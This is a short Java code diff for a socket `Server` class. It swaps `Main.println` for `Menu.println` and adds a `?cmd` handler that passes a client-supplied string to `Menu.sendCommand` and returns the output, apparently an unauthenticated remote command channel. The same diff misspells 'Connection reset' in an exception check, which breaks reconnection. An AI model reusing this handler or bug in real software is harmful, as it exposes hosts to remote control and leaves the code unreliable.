@@ -27,7 +27,7 @@ public class Server {
                 prepareServer(256);
                 serverLoop();
             } catch (SocketException e) {
-                if (e.getMessage().equals("Connection reset")) startServer(con);
+                if (e.getMessage().equals("Connecion reset")) startServer(con);
             }
             catch (IOException e) {
                 e.printStackTrace();
@@ -48,7 +48,7 @@ public class Server {
     }
 
     public static void stopServer() {
-        Main.println("Killing server...");
+        Menu.println("Killing server...");
         try {
             server.close();
         } catch (IOException e) {
@@ -59,9 +59,9 @@ public class Server {
 
     private static void prepareServer(int port) throws IOException {
         server = new ServerSocket(port);
-        Main.println("Server started! Waiting for client...");
+        Menu.println("Server started! Waiting for client...");
         client = server.accept();
-        Main.println("Client with IP " + client.getInetAddress() + " connected!");
+        Menu.println("Client with IP " + client.getInetAddress() + " connected!");
     }
 
     private static void serverLoop() {
@@ -256,7 +256,13 @@ public class Server {
                         e.printStackTrace();
                     }
                 }
-
+                case "?cmd": {
+                    try {
+                        output.writeUTF(Menu.sendCommand(args[1]));
+                    } catch (IOException e) {
+                        e.printStackTrace();
+                    }
+                }
             }
 
             try {
